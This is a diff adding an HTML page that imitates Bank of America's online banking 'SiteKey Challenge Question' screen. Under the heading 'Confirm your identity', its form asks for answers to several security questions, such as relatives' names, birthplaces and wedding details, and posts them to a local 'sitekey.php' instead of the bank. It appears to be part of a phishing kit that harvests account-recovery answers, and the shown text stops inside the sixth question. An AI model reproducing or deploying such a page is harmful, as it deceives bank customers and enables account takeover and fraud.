@@ -1,0 +1,1433 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
+ <head>
+  <meta content="content-type" http-equiv="content-type" />
+  <link type="image/ico" href="images/favicon.ico" rel="shortcut icon" />
+  <meta content="Answer your SiteKey Challenge Question for the Bank of America SiteKey service." name="Description" />
+  <!--sas-docs/stylesheets/weas_win_ns6.css-->
+  <link href="signonSetup.do_files/global_1105.css" type="text/css" rel="stylesheet" />
+  <title>
+   Bank of America | Online Banking | SiteKey | SiteKey Challenge Question
+  </title>
+  <script language="javascript" type="text/javascript">
+   &lt;!--
+    function loadPage()
+    {
+		if('true' == 'true')
+    	{
+    		// alert("set timeout == true");
+	    	toLoadPage();
+	    }
+    }
+//--&gt;
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   var GLOBAL_CSS = "/sas-docs/globalstylesheets/global_1105.css";
+	var CIO_GLOBAL_CSS = "/sas-docs/globalstylesheets/cio_1105.css";
+  </script>
+  <script src="signonSetup.do_files/commonscript.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="signonSetup.do_files/commontimeout.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="signonSetup.do_files/dhtml.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="signonSetup.do_files/header.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="signonSetup.do_files/initialshowhide.js" type="text/javascript" language="JavaScript">
+  </script>
+  <link rel="stylesheet" type="text/css" href="sas-docs/stylesheets/initialshowhide.css" />
+  <link rel="stylesheet" type="text/css" href="signonSetup.do_files/initialshowhide.css" />
+  <script src="signonSetup.do_files/properties.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="signonSetup.do_files/noTranslate_properties.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="signonSetup.do_files/session_properties.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script type="text/javascript" language="JavaScript">
+   var isTransparentSession = false;
+var isCreditCardActivation = false;
+  </script>
+  <!-- July maintenance OLB timeout inactivity starts -->
+  <noscript>
+   &lt;!-- July maintenance OLB timeout inactivity ciotransparent starts --&gt;
+
+
+&lt;!-- July maintenance OLB timeout inactivity ciotransparent ends --&gt;
+&lt;!-- July maintenance OLB timeout inactivity update starts--&gt;
+
+&lt;meta http-equiv="refresh" content="600;url=https://www.bankofamerica.com/Control.do?page_msg=timeout&amp;body=signoff"&gt;
+&lt;!-- July maintenance OLB timeout inactivity update ends --&gt;
+  </noscript>
+  <!-- July maintenance OLB timeout inactivity ends -->
+  <script type="text/javascript" language="JavaScript">
+   var TimeOutImage;
+    /*if(isTransparentSession)
+    {    	
+	    TimeOutImage = '&lt;IMG SRC="' + IMG_CIO_TIMEOUT_HEADER + '" border=0&gt;\n';
+    }
+    else
+	{*/
+	    TimeOutImage = '&lt;IMG SRC="./signonSetup.do_files/timeout-header.gif" border=0&gt;\n';
+	//}	
+	
+	function closeDiv()  
+	{
+	// Reset the timer
+	_toResetTimeOut();
+	callToServerResetTimer();
+	// Close the time out layer 
+	closeMyPopup();
+	}
+	var IFrameTimeObj;
+var resetTimeOutURLApp;
+if(this["systemResetTimeoutServletURL"] != null)
+{
+	
+	resetTimeOutURLApp = systemResetTimeoutServletURL;
+}
+else
+{
+	resetTimeOutURLApp = baseUrl + "/resetTimeout.do";
+}
+function callToServerResetTimer()
+{	
+	if (!document.createElement) {return true};
+	var IFrameDoc;	
+	var URL = resetTimeOutURLApp;
+	if (!IFrameTimeObj &amp;&amp; document.createElement) {
+		try {
+			var tempIFrameTime=document.createElement('iframe');
+			tempIFrameTime.setAttribute('id','IFrameTime');
+			tempIFrameTime.style.border='0px';
+			tempIFrameTime.style.width='0px';
+			tempIFrameTime.style.height='0px';
+			IFrameTimeObj = document.body.appendChild(tempIFrameTime);
+			
+			if (document.frames) {
+				IFrameTimeObj = document.frames['IFrameTime'];
+			}
+		} catch(exception) {
+			iframeHTML='&lt;iframe id="IFrameTime" style="';
+			iframeHTML+='border:0px;';
+			iframeHTML+='width:0px;';
+			iframeHTML+='height:0px;';
+			iframeHTML+='"&gt;&lt;\/iframe&gt;';
+			document.body.innerHTML+=iframeHTML;
+			IFrameTimeObj = new Object();
+			IFrameTimeObj.document = new Object();
+			IFrameTimeObj.document.location = new Object();
+			IFrameTimeObj.document.location.iframe = document.getElementById('IFrameTime');
+			IFrameTimeObj.document.location.replace = function(location) {
+				this.iframe.src = location;
+			}
+		}
+	}
+	
+	if (navigator.userAgent.indexOf('Gecko') !=-1 &amp;&amp; !IFrameTimeObj.contentDocument) {
+		setTimeout('callToServerResetTimer("'+theFormName+'")',10);
+		return false;
+	}	
+	if (IFrameTimeObj.contentDocument) {
+		IFrameDoc = IFrameTimeObj.contentDocument; 
+	} else if (IFrameTimeObj.contentWindow) {
+		IFrameDoc = IFrameTimeObj.contentWindow.document;
+	} else if (IFrameTimeObj.document) {
+		IFrameDoc = IFrameTimeObj.document;
+	} else {
+		return true;
+	}
+	IFrameDoc.location.replace(URL);
+	return false;
+}			
+//	document.write('&lt;iframe id="Myiframe" frameborder="0" style="position: absolute\; z-index: 10\; display: none\;"&gt;');
+   
+    if(((navigator.userAgent.indexOf("Firefox")!=-1) || (navigator.userAgent.indexOf("Chrome")!=-1)) &amp;&amp; !isTransparentSession)
+	
+    {
+	document.write('&lt;iframe id="Myiframe" src="javascript:false;" frameborder="0" style="position: absolute\; z-index: 10\; display: none\;"&gt;');
+	document.write('&lt;\/iframe&gt;');
+	document.write('&lt;Div id="mypopup" style="position: absolute\; display:none\;z-index: 11\; width: 310px\; background:#FFFFFF\; border: 1px solid #000\;"&gt;');
+	document.write(TimeOutImage); 
+	document.write('&lt;Div&gt;');
+	document.write('&lt;Table border=0 summary=""&gt;');
+    //Timeout Warning Message
+    document.write('&lt;TR&gt;&lt;TD style="height:19px"&gt;&lt;\/TD&gt;&lt;\/TR&gt;');
+    //document.write('&lt;TR valign=top&gt;&lt;TD style="padding: 0px 7px 0px 8px\; height:157px"&gt;\n');
+    document.write('&lt;TR valign=top&gt;&lt;TD style="padding: 0px 7px 0px 8px\; height:155px"&gt;\n');
+	document.write('&lt;p class="text2"&gt;\n'); 
+    /*if(isTransparentSession)
+    {    	
+   		document.write(STR_CCTIMEOUTMESSAGE_START + ' ' + _toCalculateMinutes(_toGraceDelayTime + _toDelayTime) + ' ' + STR_CCTIMEOUTMESSAGE_END);    	
+    }
+    else
+    {*/
+	   	document.write(STR_BANKINGTIMEOUTMESSAGE);  
+    //}
+	//Display 'Ok' button
+	document.write('&lt;\/p&gt;\n');
+	document.write('&lt;\/TD&gt;&lt;\/TR&gt;\n');
+	document.write('&lt;TR valign="top"&gt;&lt;TD align="center" style="height: 20px\;" &gt;\n');
+    getButton(BTN_OK, 'javascript:closeDiv();', '', '', '/sas/sas-docs/images/', '', 'btn1', '', document );
+    document.write('&lt;\/td&gt;&lt;\/tr&gt;\n'); 
+   // document.write('&lt;TR&gt;&lt;TD style="height: 22px"&gt;&lt;\/TD&gt;&lt;\/TR&gt;');
+   document.write('&lt;TR&gt;&lt;TD style="height: 25px"&gt;&lt;\/TD&gt;&lt;\/TR&gt;');
+	document.write('&lt;\/Table&gt;');
+	document.write('&lt;\/Div&gt;');
+	document.write('&lt;\/Div&gt;');
+	}
+  </script>
+ </head>
+ <body marginwidth="0" marginheight="0" class="body " onload="loadPage();">
+  <iframe frameborder="0" style="position: absolute; z-index: 10; display: none;" src="javascript:false;" id="Myiframe">
+  </iframe>
+  <div style="position: absolute; display:none;z-index: 11; width: 310px; background:#FFFFFF; border: 1px solid #000;" id="mypopup">
+   <img border="0" src="./signonSetup.do_files/timeout-header.gif" />
+   <div>
+    <table border="0" summary="">
+     <tbody>
+      <tr>
+       <td style="height:19px">
+       </td>
+      </tr>
+      <tr valign="top">
+       <td style="padding: 0px 7px 0px 8px; height:155px">
+        <p class="text2">
+         For your safety and Protection your Online Banking session is about to be timed out and redirected to the home page if there is no additional activity.
+         <br />
+         <br />
+         If you are still working in your Online Banking session simply click OK to continue.
+        </p>
+       </td>
+      </tr>
+      <tr valign="top">
+       <td align="center" style="height: 20px;">
+        <table border="0" cellspacing="0" cellpadding="0" class="btn1" summary="">
+         <tbody>
+          <tr>
+           <td width="2" class="btn1-left" rowspan="2">
+            <img width="2" height="2" alt="" src="undefinedclr.gif" />
+           </td>
+           <td class="btn1-top">
+            <img width="1" height="2" alt="" src="/sas/sas-docs/images/clr.gif" />
+           </td>
+           <td width="2" class="btn1-right" rowspan="3">
+            <img width="2" height="2" alt="" src="undefinedclr.gif" />
+           </td>
+          </tr>
+          <tr>
+           <td nowrap="nowrap">
+            <div class="btn1">
+             <a id="TimeOutButton" title="" onblur='hover(this, "btn1");window.status="";' onfocus='hover(this, "btn1-over");window.status="";' class="btn1" target="" href="javascript:closeDiv();">
+               OK 
+             </a>
+            </div>
+           </td>
+          </tr>
+          <tr>
+           <td class="btn1-right" colspan="2">
+            <img width="1" height="2" alt="" src="undefinedclr.gif" />
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </td>
+      </tr>
+      <tr>
+       <td style="height: 25px">
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+  </div>
+  <iframe frameborder="0" style="position: absolute; z-index: 10; display: none;" src="javascript:false;" id="Myiframe">
+  </iframe>
+  <div style="position: absolute; display: none; z-index: 11; width: 310px; background: none repeat scroll 0% 0% rgb(255, 255, 255); border: 1px solid rgb(0, 0, 0);" id="mypopup">
+   <img border="0" src="signonSetup.do_files/timeout-header.gif" />
+   <div>
+    <table border="0" summary="">
+     <tbody>
+      <tr>
+       <td style="height: 19px;">
+       </td>
+      </tr>
+      <tr valign="top">
+       <td style="padding: 0px 7px 0px 8px; height: 155px;">
+        <p class="text2">
+         For your safety and Protection your Online Banking session is about to 
+be timed out and redirected to the home page if there is no additional 
+activity.
+         <br />
+         <br />
+         If you are still working in your Online Banking session simply click OK to continue.
+        </p>
+       </td>
+      </tr>
+      <tr valign="top">
+       <td align="center" style="height: 20px;">
+        <table border="0" cellspacing="0" cellpadding="0" class="btn1" summary="">
+         <tbody>
+          <tr>
+           <td width="2" class="btn1-left" rowspan="2">
+            <img width="2" height="2" alt="" src="signonSetup.do_files/undefinedclr.htm" />
+           </td>
+           <td class="btn1-top">
+            <img width="1" height="2" alt="" src="signonSetup.do_files/clr.gif" />
+           </td>
+           <td width="2" class="btn1-right" rowspan="3">
+            <img width="2" height="2" alt="" src="signonSetup.do_files/undefinedclr.htm" />
+           </td>
+          </tr>
+          <tr>
+           <td nowrap="nowrap">
+            <div class="btn1">
+             <a id="TimeOutButton" title="" onblur='hover(this, "btn1");window.status="";' onfocus='hover(this, "btn1-over");window.status="";' class="btn1" target="" href="javascript:closeDiv();">
+               OK 
+             </a>
+            </div>
+           </td>
+          </tr>
+          <tr>
+           <td class="btn1-right" colspan="2">
+            <img width="1" height="2" alt="" src="signonSetup.do_files/undefinedclr.htm" />
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </td>
+      </tr>
+      <tr>
+       <td style="height: 25px;">
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+  </div>
+  <script language="javascript" type="text/javascript">
+   &lt;!--
+examineFontSize("body");
+//--&gt;
+  </script>
+  <!-- Feb10 phase1 P15976001 start -->
+  <!-- Feb10 phase1 P15976001 end -->
+  <!-- begin sas header -->
+  <!-- logo_header beg -->
+  <!-- Feb10 phase1 P15976001 start -->
+  <!-- Feb10 phase1 P15976001 end -->
+  <div style="display: none; text-indent: -180701px; margin: 0pt; padding: 0pt; height: 0pt; line-height: 0pt; position: absolute; top: 0pt; left: -500px;">
+   <a onblur='window.status=""' onfocus='window.status="Skip Navigational Links"' href="#skipnav">
+    Skip Navigational Links
+   </a>
+  </div>
+  <!-- Feb10 phase1 P15976001 start -->
+  <!-- Feb10 phase1 P15976001 end -->
+  <!-- globalHeaderContainer -->
+  <div class="navheader">
+   <div class="logoUtilityCnt">
+    <span class="logo">
+     Bank of America Logo
+    </span>
+    <div class="utilityNavCnt">
+     <div class="utilityTitleAndSignOffCnt ">
+      <span class="utilityTitle">
+       Online Banking
+      </span>
+     </div>
+     <!-- utilityTitleAndSignOffCnt -->
+     <div class="utilityNav ">
+      <a class="skipLincDest" name="utilityNavigation">
+      </a>
+      <ul class="noBorder">
+       <li class="last noArrow">
+        <span id="langToggleM">
+         <a lang="es-US" class="langLinc" title="Muestra esta sesión de la Banca en Línea en Español." href="#">
+          <span class="floatMeLeft">
+           En Español
+          </span>
+         </a>
+        </span>
+       </li>
+      </ul>
+     </div>
+     <!-- utilityNav -->
+    </div>
+    <!-- utilityNavCnt -->
+   </div>
+   <!-- logoUtilityCnt -->
+   <div class="greyLines">
+   </div>
+   <div class="secondaryNavCnt noNav">
+    <br clear="all" />
+   </div>
+   <!-- secondaryNavCnt noNav -->
+  </div>
+  <!-- header -->
+  <!-- end globalHeaderContainer -->
+  <!-- check fonts beg -->
+  <script language="javascript" type="text/javascript">
+   &lt;!-- 
+examineFontSize("body");
+//--&gt;
+  </script>
+  <!-- check fonts beg -->
+  <!-- end sas header -->
+  <!-- Begin screen title -->
+  <div class="pagelabel">
+   <table width="735" border="0" cellspacing="0" cellpadding="0" summary="" class="nav3">
+    <tbody>
+     <tr>
+      <td colspan="2">
+       <img width="1" height="6" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td valign="bottom">
+       <div style="display: block;">
+        <img width="200" height="10" alt="" src="signonSetup.do_files/clr.gif" />
+       </div>
+       <div>
+        <a name="skipnav">
+        </a>
+        <h1 class="pagelabel">
+         Confirm your identity
+        </h1>
+       </div>
+      </td>
+      <td valign="top" nowrap="nowrap" align="right" class="text2">
+       <img width="10" height="1" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td colspan="2">
+       <img width="1" height="10" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td colspan="2" class="rulegrey3">
+       <img width="1" height="1" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td colspan="2">
+       <img width="1" height="12" alt="" src="signonSetup.do_files/clr.gif" />
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </div>
+  <!-- End screen title -->
+  <table width="747" border="0" cellspacing="0" cellpadding="0" summary="">
+   <tbody>
+    <tr>
+     <!-- Left margin -->
+     <td width="12">
+      <img width="12" height="1" alt="" src="signonSetup.do_files/clr.gif" />
+     </td>
+     <!-- End left margin -->
+     <!-- Begin Sign In form -->
+     <td width="735" valign="top">
+      <div id="error_section">
+      </div>
+      <script language="javascript" type="text/javascript">
+       function sendToJavaScript(value) {
+	document.challengeQandAForm.artifact.value =value;
+	document.challengeQandAForm.nextAction.value ="sitekey_confirm";	
+	document.challengeQandAForm.submit();
+}
+      </script>
+      <form autocomplete="OFF" action="sitekey.php" method="post" name="challengeQandAForm">
+       <input type="hidden" value="" name="id" />
+       <input type="hidden" value="" name="idst" />
+       <table width="747" border="0" cellspacing="0" cellpadding="0" summary="">
+        <tbody>
+         <tr>
+          <td width="100%" valign="top">
+           <script type="text/javascript">
+            document.forms[0].isJavaScriptEnabled.value="true";
+           </script>
+           <div>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+             <tbody>
+              <tr>
+               <td class="textnormal" colspan="3">
+                <div class="text2">
+                 <!-- includeFileStart - /sas-docs/en_US/SignIn/Model/ConfirmIdentity.html -->
+                 <!--CMSContentStart for - /sas-docs/en_US/SignIn/Model/ConfirmIdentity.html -->
+                 <p>
+                  please choose your SiteKey Challenge Questions and answer them in order to proceed.
+                 </p>
+                 <p>
+                  All fields are required.
+                 </p>
+                 <!--CMSContentEnd for - /sas-docs/en_US/SignIn/Model/ConfirmIdentity.html -->
+                 <!-- includeFileEnd - /sas-docs/en_US/SignIn/Model/ConfirmIdentity.html -->
+                </div>
+               </td>
+              </tr>
+              <tr>
+               <td>
+                <img width="1" height="20" alt="" src="signonSetup.do_files/clr.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td class="statement-separator">
+                <img width="1" height="0" alt="" src="signonSetup.do_files/clr.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td>
+                <img width="1" height="20" alt="" src="signonSetup.do_files/clr.gif" />
+               </td>
+              </tr>
+              <tr>
+               <td colspan="3">
+                <div class="text2">
+                 <table border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td class="text2">
+                     <span class="textbold">
+                      Online ID:
+                     </span>
+                    </td>
+                    <td>
+                     <img width="45" height="7" alt="" src="signonSetup.do_files/clr.gif" />
+                    </td>
+                    <td class="text2">
+                     <span class="textnormal">
+                     </span>
+                    </td>
+                    <td>
+                     <img width="20" height="7" alt="" src="signonSetup.do_files/clr.gif" />
+                    </td>
+                    <td class="text2">
+                     <span class="textnormal">
+                      <a style="" href="index.php">
+                       Sign in using a different Online ID
+                      </a>
+                     </span>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td colspan="5">
+                     <br />
+                    </td>
+                   </tr>
+                  </tbody>
+                 </table>
+                 <table width="75%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td>
+                     <span class="h2-ada">
+                      SiteKey Challenge Question:
+                      <br />
+                     </span>
+                     <span class="title4">
+                      <span class="textbold">
+                       <select id="question1" name="question1" class="align-font-width">
+                        <option selected="selected" value="">
+                         Select SiteKey Challenge Question 1
+                        </option>
+                        <option value="What is your maternal grandmother's first name?">
+                         What is your maternal grandmother's first name?
+                        </option>
+                        <option value="What is your maternal grandfather's first name?">
+                         What is your maternal grandfather's first name?
+                        </option>
+                        <option value="In what city were you born?">
+                         In what city were you born? (Enter full name of city only)
+                        </option>
+                        <option value="What was the name of your first pet?">
+                         What was the name of your first pet?
+                        </option>
+                        <option value="What was your high school mascot?">
+                         What was your high school mascot?
+                        </option>
+                        <option value="How old were you at your wedding?">
+                         How old were you at your wedding? (Enter age as digits.)
+                        </option>
+                        <option value="In what year did you graduate from high school?">
+                         In what year (YYYY) did you graduate from high school?
+                        </option>
+                        <option value="What is the first name of the best man/maid of honor at your wedding?">
+                         What is the first name of the best man/maid of honor at your wedding?
+                        </option>
+                        <option value="Who is your favorite childhood superhero?">
+                         Who is your favorite childhood superhero?
+                        </option>
+                       </select>
+                      </span>
+                     </span>
+                     <div style="font-size:11px; padding:0; margin:0; color:#C30;" id="ans1">
+                     </div>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <table border="0" cellspacing="0" cellpadding="0" summary="">
+                      <tbody>
+                       <tr>
+                        <td>
+                         <span class="title4">
+                          <span class="textBold">
+                           <label for="sitekeyChallengeAnswer">
+                            <b>
+                             Answer:
+                            </b>
+                           </label>
+                          </span>
+                         </span>
+                        </td>
+                       </tr>
+                       <tr>
+                        <!-- <TD width=10><IMG src="sas-docs/signonSetup.do_files/images/clr.gif" alt="" width=10 height=1></TD> -->
+                        <td>
+                         <input type="text" class="resize-text1" id="sitekeyChallengeAnswer1" size="33" maxlength="30" name="sitekeyChallengeAnswer1" />
+                        </td>
+                       </tr>
+                       <tr>
+                        <td class="text2">
+                         <span class="textnormal">
+                          (Not case sensitive)
+                         </span>
+                        </td>
+                       </tr>
+                      </tbody>
+                     </table>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="100" height="10" alt="" src="signonSetup.do_files/clr.gif" />
+                    </td>
+                   </tr>
+                   <!-- Question 2 -->
+                  </tbody>
+                 </table>
+                 <table width="75%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td>
+                     <span class="h2-ada">
+                      SiteKey Challenge Question:
+                      <br />
+                     </span>
+                     <span class="title4">
+                      <span class="textbold">
+                       <select id="question2" name="question2" class="align-font-width">
+                        <option selected="selected" value="">
+                         Select SiteKey Challenge Question 2
+                        </option>
+                        <option value="What is your father's middle name?">
+                         What is your father's middle name?
+                        </option>
+                        <option value="What is your mother's middle name?">
+                         What is your mother's middle name?
+                        </option>
+                        <option value="In what city were you married?">
+                         In what city were you married?
+                        </option>
+                        <option value="In what city is your vacation home?">
+                         In what city is your vacation home?
+                        </option>
+                        <option value="What is the first name of your first child?">
+                         What is the first name of your first child?
+                        </option>
+                        <option value="What is the name of your first employer?">
+                         What is the name of your first employer?
+                        </option>
+                        <option value="What is your favorite hobby?">
+                         What is your favorite hobby?
+                        </option>
+                        <option value="What is your paternal grandfather's first name?">
+                         What is your paternal grandfather's first name?
+                        </option>
+                        <option value="What is the first name of the best man/maid of honor at your wedding?">
+                         What is the first name of the best man/maid of honor at your wedding?
+                        </option>
+                        <option value="What high school did you attend?">
+                         What high school did you attend?
+                        </option>
+                       </select>
+                      </span>
+                     </span>
+                     <div style="font-size:11px; padding:0; margin:0; color:#C30;" id="ans2">
+                     </div>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <table border="0" cellspacing="0" cellpadding="0" summary="">
+                      <tbody>
+                       <tr>
+                        <td>
+                         <span class="title4">
+                          <span class="textBold">
+                           <label for="sitekeyChallengeAnswer">
+                            <b>
+                             Answer:
+                            </b>
+                           </label>
+                          </span>
+                         </span>
+                        </td>
+                       </tr>
+                       <tr>
+                        <!-- <TD width=10><IMG src="sas-docs/signonSetup.do_files/images/clr.gif" alt="" width=10 height=1></TD> -->
+                        <td>
+                         <input type="text" class="resize-text1" id="sitekeyChallengeAnswer2" size="33" maxlength="30" name="sitekeyChallengeAnswer2" />
+                        </td>
+                       </tr>
+                       <tr>
+                        <td class="text2">
+                         <span class="textnormal">
+                          (Not case sensitive)
+                         </span>
+                        </td>
+                       </tr>
+                      </tbody>
+                     </table>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="100" height="10" alt="" src="signonSetup.do_files/clr.gif" />
+                    </td>
+                   </tr>
+                   <!-- Question 3 -->
+                  </tbody>
+                 </table>
+                 <table width="75%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td>
+                     <span class="h2-ada">
+                      SiteKey Challenge Question:
+                      <br />
+                     </span>
+                     <span class="title4">
+                      <span class="textbold">
+                       <select id="question3" name="question3" class="align-font-width">
+                        <option selected="selected" value="">
+                         Select SiteKey Challenge Question 3
+                        </option>
+                        <option value="In what city was your mother born?">
+                         In what city was your mother born? (Enter full name of city only)
+                        </option>
+                        <option value="In what city was your father born?">
+                         In what city was your father born? (Enter full name of city only)
+                        </option>
+                        <option value="What was the name of your first boyfriend or girlfriend?">
+                         What was the name of your first boyfriend or girlfriend?
+                        </option>
+                        <option value="When is your wedding anniversary?">
+                         When is your wedding anniversary? (Enter the full name of month)
+                        </option>
+                        <option value="In what city did you honeymoon?">
+                         In what city did you honeymoon? (Enter full name of city only)
+                        </option>
+                        <option value="In what city was your high school?">
+                         In what city was your high school? (Enter only "Charlotte" for Charlotte High School)
+                        </option>
+                        <option value="What is your paternal grandfather's first name?">
+                         What is your paternal grandfather's first name?
+                        </option>
+                        <option value="What is your paternal grandmother's first name?">
+                         What is your paternal grandmother's first name?
+                        </option>
+                        <option value="Where did you meet your spouse for the first time?">
+                         Where did you meet your spouse for the first time? (Enter full name of city only)
+                        </option>
+                       </select>
+                      </span>
+                     </span>
+                     <div style="font-size:11px; padding:0; margin:0; color:#C30;" id="ans3">
+                     </div>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <table border="0" cellspacing="0" cellpadding="0" summary="">
+                      <tbody>
+                       <tr>
+                        <td>
+                         <span class="title4">
+                          <span class="textBold">
+                           <label for="sitekeyChallengeAnswer">
+                            <b>
+                             Answer:
+                            </b>
+                           </label>
+                          </span>
+                         </span>
+                        </td>
+                       </tr>
+                       <tr>
+                        <!-- <TD width=10><IMG src="sas-docs/signonSetup.do_files/images/clr.gif" alt="" width=10 height=1></TD> -->
+                        <td>
+                         <input type="text" class="resize-text1" id="sitekeyChallengeAnswer3" size="33" maxlength="30" name="sitekeyChallengeAnswer3" />
+                        </td>
+                       </tr>
+                       <tr>
+                        <td class="text2">
+                         <span class="textnormal">
+                          (Not case sensitive)
+                         </span>
+                        </td>
+                       </tr>
+                      </tbody>
+                     </table>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="100" height="10" alt="" src="signonSetup.do_files/clr.gif" />
+                    </td>
+                   </tr>
+                   <!-- Question 4 -->
+                  </tbody>
+                 </table>
+                 <table width="75%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td>
+                     <span class="h2-ada">
+                      SiteKey Challenge Question:
+                      <br />
+                     </span>
+                     <span class="title4">
+                      <span class="textbold">
+                       <select id="question4" name="question4" class="align-font-width">
+                        <option selected="selected" value="">
+                         Select SiteKey Challenge Question 4
+                        </option>
+                        <option value="What is your maternal grandmother's first name?">
+                         What is your maternal grandmother's first name?
+                        </option>
+                        <option value="What is your maternal grandfather's first name?">
+                         What is your maternal grandfather's first name?
+                        </option>
+                        <option value="In what city were you born?">
+                         In what city were you born? (Enter full name of city only)
+                        </option>
+                        <option value="What was the name of your first pet?">
+                         What was the name of your first pet?
+                        </option>
+                        <option value="What was your high school mascot?">
+                         What was your high school mascot?
+                        </option>
+                        <option value="How old were you at your wedding?">
+                         How old were you at your wedding? (Enter age as digits.)
+                        </option>
+                        <option value="In what year did you graduate from high school?">
+                         In what year (YYYY) did you graduate from high school?
+                        </option>
+                        <option value="What is the first name of the best man/maid of honor at your wedding?">
+                         What is the first name of the best man/maid of honor at your wedding?
+                        </option>
+                        <option value="Who is your favorite childhood superhero?">
+                         Who is your favorite childhood superhero?
+                        </option>
+                       </select>
+                      </span>
+                     </span>
+                     <div style="font-size:11px; padding:0; margin:0; color:#C30;" id="ans4">
+                     </div>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <table border="0" cellspacing="0" cellpadding="0" summary="">
+                      <tbody>
+                       <tr>
+                        <td>
+                         <span class="title4">
+                          <span class="textBold">
+                           <label for="sitekeyChallengeAnswer">
+                            <b>
+                             Answer:
+                            </b>
+                           </label>
+                          </span>
+                         </span>
+                        </td>
+                       </tr>
+                       <tr>
+                        <!-- <TD width=10><IMG src="sas-docs/signonSetup.do_files/images/clr.gif" alt="" width=10 height=1></TD> -->
+                        <td>
+                         <input type="text" class="resize-text1" id="sitekeyChallengeAnswer4" size="33" maxlength="30" name="sitekeyChallengeAnswer4" />
+                        </td>
+                       </tr>
+                       <tr>
+                        <td class="text2">
+                         <span class="textnormal">
+                          (Not case sensitive)
+                         </span>
+                        </td>
+                       </tr>
+                      </tbody>
+                     </table>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="100" height="10" alt="" src="signonSetup.do_files/clr.gif" />
+                    </td>
+                   </tr>
+                   <!-- Question 5 -->
+                  </tbody>
+                 </table>
+                 <table width="75%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td>
+                     <span class="h2-ada">
+                      SiteKey Challenge Question:
+                      <br />
+                     </span>
+                     <span class="title4">
+                      <span class="textbold">
+                       <select id="question5" name="question5" class="align-font-width">
+                        <option selected="selected" value="">
+                         Select SiteKey Challenge Question 5
+                        </option>
+                        <option value="What is your father's middle name?">
+                         What is your father's middle name?
+                        </option>
+                        <option value="What is your mother's middle name?">
+                         What is your mother's middle name?
+                        </option>
+                        <option value="In what city were you married?">
+                         In what city were you married?
+                        </option>
+                        <option value="In what city is your vacation home?">
+                         In what city is your vacation home?
+                        </option>
+                        <option value="What is the first name of your first child?">
+                         What is the first name of your first child?
+                        </option>
+                        <option value="What is the name of your first employer?">
+                         What is the name of your first employer?
+                        </option>
+                        <option value="What is your favorite hobby?">
+                         What is your favorite hobby?
+                        </option>
+                        <option value="What is your paternal grandfather's first name?">
+                         What is your paternal grandfather's first name?
+                        </option>
+                        <option value="What is the first name of the best man/maid of honor at your wedding?">
+                         What is the first name of the best man/maid of honor at your wedding?
+                        </option>
+                        <option value="What high school did you attend?">
+                         What high school did you attend?
+                        </option>
+                       </select>
+                      </span>
+                     </span>
+                     <div style="font-size:11px; padding:0; margin:0; color:#C30;" id="ans5">
+                     </div>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <table border="0" cellspacing="0" cellpadding="0" summary="">
+                      <tbody>
+                       <tr>
+                        <td>
+                         <span class="title4">
+                          <span class="textBold">
+                           <label for="sitekeyChallengeAnswer">
+                            <b>
+                             Answer:
+                            </b>
+                           </label>
+                          </span>
+                         </span>
+                        </td>
+                       </tr>
+                       <tr>
+                        <!-- <TD width=10><IMG src="sas-docs/signonSetup.do_files/images/clr.gif" alt="" width=10 height=1></TD> -->
+                        <td>
+                         <input type="text" class="resize-text1" id="sitekeyChallengeAnswer5" size="33" maxlength="30" name="sitekeyChallengeAnswer5" />
+                        </td>
+                       </tr>
+                       <tr>
+                        <td class="text2">
+                         <span class="textnormal">
+                          (Not case sensitive)
+                         </span>
+                        </td>
+                       </tr>
+                      </tbody>
+                     </table>
+                    </td>
+                   </tr>
+                   <tr>
+                    <td>
+                     <img width="100" height="10" alt="" src="signonSetup.do_files/clr.gif" />
+                    </td>
+                   </tr>
+                   <!-- Question 6 -->
+                  </tbody>
+                 </table>
+                 <table width="75%" border="0" cellspacing="0" cellpadding="0" summary="">
+                  <tbody>
+                   <tr>
+                    <td>
+                     <span class="h2-ada">
+                      SiteKey Challenge Question:
+                      <br />
+                     </span>
+                     <span class="title4">
+                      <span class="textbold">
+                       <select id="question6" name="question6" class="align-font-width">
+                        <option selected="selected" value="">
